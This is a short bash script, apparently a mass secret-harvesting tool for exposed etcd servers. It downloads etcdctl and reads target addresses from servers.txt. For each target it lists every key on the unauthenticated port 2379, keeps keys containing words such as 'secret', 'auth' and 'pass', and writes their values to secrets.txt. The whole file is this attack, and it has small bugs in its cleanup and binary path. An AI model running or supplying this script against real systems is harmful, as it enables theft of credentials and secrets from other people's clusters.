#!/bin/bash
curl -O https://github.com/etcd-io/etcd/releases/download/v3.6.5/etcd-v3.6.5-linux-amd64.tar.gz
tar -xzf etcd-v3.6.5-linux-amd64.tar.gz
cp etcd-v3.6.5-linux-amd64/etcdctl ./etcdctl
rm -rf etcd-v3.6.5-linux-amd64.tar.gz etcd-v3.6.5-linux-amd64.tar.gz
for server in `cat servers.txt`
do
echo $server >> secrets.txt
etcdctl get "" --prefix --keys-only --command-timeout=3s --endpoints=http://$server:2379 | grep -e "secret\|login\|username\|auth\|pass" 2>/dev/null > tmp_keys.txt
for key in `cat tmp_keys.txt`
do
etcdctl get "$key" --prefix --endpoints=http://$server:2379 >> secrets.txt
done
done
rm tmp_keys.txt
